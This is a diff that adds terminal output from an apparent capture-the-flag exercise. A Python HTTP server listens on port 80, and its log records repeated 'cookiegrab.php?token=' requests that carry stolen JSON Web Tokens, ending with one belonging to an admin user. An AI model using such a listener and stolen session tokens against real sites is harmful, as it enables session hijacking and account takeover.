@@ -1,0 +1,8 @@
+❯ sudo python3 -m http.server 80
+[sudo] password for divu050704: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.17.0.215 - - [30/Nov/2022 19:24:05] "GET /cookiegrab.php?token=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjY5ODE2MjAzfQ.3EwTQ6_8PYmwO6JUgPOhxPl8fPOU9JfqKQw7TbK3R5E HTTP/1.1" 200 -
+10.17.0.215 - - [30/Nov/2022 19:24:24] "GET /cookiegrab.php?token=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjY5ODE2MjAzfQ.3EwTQ6_8PYmwO6JUgPOhxPl8fPOU9JfqKQw7TbK3R5E HTTP/1.1" 200 -
+10.17.0.215 - - [30/Nov/2022 19:25:01] "GET /cookiegrab.php?token=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjY5ODE2MjAzfQ.3EwTQ6_8PYmwO6JUgPOhxPl8fPOU9JfqKQw7TbK3R5E HTTP/1.1" 200 -
+10.17.0.215 - - [30/Nov/2022 19:25:53] "GET /cookiegrab.php?token=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjY5ODE2MjAzfQ.3EwTQ6_8PYmwO6JUgPOhxPl8fPOU9JfqKQw7TbK3R5E HTTP/1.1" 200 -
+10.10.171.76 - - [30/Nov/2022 19:27:15] "GET /cookiegrab.php?token=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2Njk4MTY2Mzd9.pq8Ia-XbTWMiW9MI-i1VD0JvWkmqzEoeymBfE0KO3eE HTTP/1.1" 200 -
